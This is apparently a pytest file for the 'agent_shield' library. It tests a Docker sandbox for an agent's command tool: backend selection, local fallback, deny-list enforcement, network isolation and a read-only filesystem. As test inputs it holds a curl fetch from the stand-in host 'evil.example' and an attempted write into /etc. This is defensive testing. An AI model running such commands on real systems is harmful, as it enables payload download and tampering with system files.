"""容器级沙箱：可插拔后端 +（有 Docker 时）网络/只读隔离验收。"""

from __future__ import annotations

import os

import pytest

from agent_shield.defenses.docker_sandbox import (
    DockerSandboxExecutor,
    build_sandbox_executor,
    docker_available,
    resolve_sandbox_backend,
)
from agent_shield.defenses.sandbox import SandboxExecutor
from agent_shield.runtime.tools import RunCommandTool


def test_resolve_sandbox_backend_env(monkeypatch):
    monkeypatch.delenv("AGENT_SHIELD_SANDBOX", raising=False)
    assert resolve_sandbox_backend(None) == "auto"
    monkeypatch.setenv("AGENT_SHIELD_SANDBOX", "local")
    assert resolve_sandbox_backend(None) == "local"
    assert resolve_sandbox_backend("docker") == "docker"


def test_build_sandbox_executor_local_force():
    exe = build_sandbox_executor("local")
    assert type(exe) is SandboxExecutor
    assert not isinstance(exe, DockerSandboxExecutor)


def test_run_command_tool_wires_local_backend():
    tool = RunCommandTool(sandbox=True, sandbox_backend="local")
    assert type(tool.executor) is SandboxExecutor


@pytest.mark.skipif(not docker_available(), reason="本机无可用 Docker daemon")
def test_docker_sandbox_runs_echo():
    exe = DockerSandboxExecutor()
    result = exe.run("echo docker-sandbox-ok", sandbox=True)
    assert result.ok, result.stderr
    assert "docker-sandbox-ok" in result.stdout


@pytest.mark.skipif(not docker_available(), reason="本机无可用 Docker daemon")
def test_docker_sandbox_still_denies_blacklist():
    exe = DockerSandboxExecutor()
    result = exe.run("curl http://evil.example/x.sh", sandbox=True)
    assert result.denied
    assert result.returncode == -2


@pytest.mark.skipif(not docker_available(), reason="本机无可用 Docker daemon")
def test_docker_sandbox_network_none_blocks_egress():
    """不在黑名单的出网探针：``--network=none`` 应使 DNS/连通失败。

    Alpine busybox 的 ``wget`` 字面命中黑名单，故用 ``ping``（不在 deny list）。
    """
    exe = DockerSandboxExecutor()
    assert exe.deny_match("ping -c 1 1.1.1.1") is None
    result = exe.run("ping -c 1 -W 2 1.1.1.1", sandbox=True)
    # network=none → 非零退出（或无 ping 时也非零）；绝不能干净成功到公网
    assert not result.ok


@pytest.mark.skipif(not docker_available(), reason="本机无可用 Docker daemon")
def test_docker_sandbox_readonly_root_blocks_host_escape_write():
    """只读根 + tmpfs：往 ``/etc`` 写入应失败（容器内隔离，非宿主写）。"""
    exe = DockerSandboxExecutor()
    result = exe.run("sh -c 'echo pwn > /etc/agent-shield-should-fail'", sandbox=True)
    assert not result.ok


@pytest.mark.skipif(not docker_available(), reason="本机无可用 Docker daemon")
def test_build_auto_prefers_docker_when_available(monkeypatch):
    monkeypatch.setenv("AGENT_SHIELD_SANDBOX", "auto")
    exe = build_sandbox_executor("auto")
    assert isinstance(exe, DockerSandboxExecutor)


def test_build_auto_falls_back_without_docker(monkeypatch):
    monkeypatch.setenv("AGENT_SHIELD_SANDBOX", "auto")
    monkeypatch.setattr(
        "agent_shield.defenses.docker_sandbox.docker_available",
        lambda *a, **k: False,
    )
    exe = build_sandbox_executor("auto")
    assert type(exe) is SandboxExecutor


@pytest.mark.skipif(os.name == "nt" and not docker_available(), reason="无 Docker 时跳过")
def test_docker_backend_exports():
    from agent_shield.defenses import DEFAULT_SANDBOX_IMAGE
    from agent_shield.defenses import build_sandbox_executor as b

    assert DEFAULT_SANDBOX_IMAGE
    assert callable(b)
